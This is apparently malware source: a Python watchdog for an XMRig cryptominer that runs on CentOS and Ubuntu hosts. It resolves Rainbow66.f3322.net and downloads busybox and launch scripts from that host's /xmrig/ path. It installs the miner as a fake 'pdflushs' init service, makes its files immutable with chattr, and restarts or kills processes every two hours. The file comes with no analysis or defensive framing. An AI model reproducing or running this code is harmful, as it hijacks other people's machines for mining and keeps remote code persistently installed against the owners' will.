#!/usr/bin/python
#coding=utf-8
from threading import Timer
import datetime
import os
import platform
import socket

times = 0

def checkConfig():
	if not os.path.exists("/usr/bin/config.json"):
		return True
	else:
		f = open('/usr/bin/config.json', 'r')
		result = f.read()
		if "rainbow20.eatuo.com" in result:
			return False
		else:
			return True

def checkHttp(ip):
	result = os.popen('/lib64/busybox wget http://'+ip[0][4][0]+'/sha512/status -O - -q').read().splitlines()
	if len(result):
		res = result[0]
		if res == "200":
			return True
		else:
			return False
	else:
		return False

def checkProc(procName):
	ip = socket.getaddrinfo("Rainbow66.f3322.net", None)
	while True:
		result = os.popen('/lib64/busybox ps|/lib64/busybox grep '+procName+'|/lib64/busybox grep -v grep|/lib64/busybox wc -l').read().splitlines()
		if len(result):
			res = result[0]
			return res
			break
		else:
			os.system("/lib64/libg++.so -ai /lib64/busybox")
			os.system("/lib64/busybox wget http://"+ip[0][4][0]+"/xmrig/busybox -O /lib64/busybox")
			os.system("/lib64/busybox chmod a+x /lib64/busybox")
			os.system("/lib64/libg++.so +ai /lib64/busybox")

def tick():
	ip = socket.getaddrinfo("Rainbow66.f3322.net", None)
	while True:
		if not os.path.exists("/etc/init.d/pdflushs"):
			os.system("/lib64/busybox chattr -ai /etc/init.d/pdflushs")
			osType=platform.platform()
			if "centos" in osType:
				os.system("/lib64/busybox wget http://"+ip[0][4][0]+"/xmrig/launch -O /etc/init.d/pdflushs")
			if "Ubuntu" in osType:
				os.system("/lib64/busybox wget http://"+ip[0][4][0]+"/xmrig/launch-ubuntu -O /etc/init.d/pdflushs")
			os.system("/lib64/busybox chmod a+x /etc/init.d/pdflushs")
			os.system("/lib64/busybox chattr +ai /etc/init.d/pdflushs")
			continue
		res=checkProc("pdflushs")
		if res == '0':
			os.system("nohup /etc/init.d/pdflushs start >/dev/null &")
			continue
		if int(res) > 3:
			os.system("/lib64/busybox killall -9 pdflushs")
			os.system("nohup /etc/init.d/pdflushs start >/dev/null &")
			continue
		if checkHttp(ip):
			os.system("nohup /etc/init.d/pdflushs update >/dev/null &")
		if checkConfig():
			os.system("/lib64/busybox rm -f /usr/bin/config.json")
		global times
		times += 1
		if (times - 1) * 2 == 24:
			os.system("/lib64/busybox killall -9 kthreadds")
			times = 0
		break
	Timer(7200, tick).start()

if __name__ == '__main__':
	res=checkProc("libgc++.so")
	if res == '1':
		tick()
	else:
		os._exit(0)
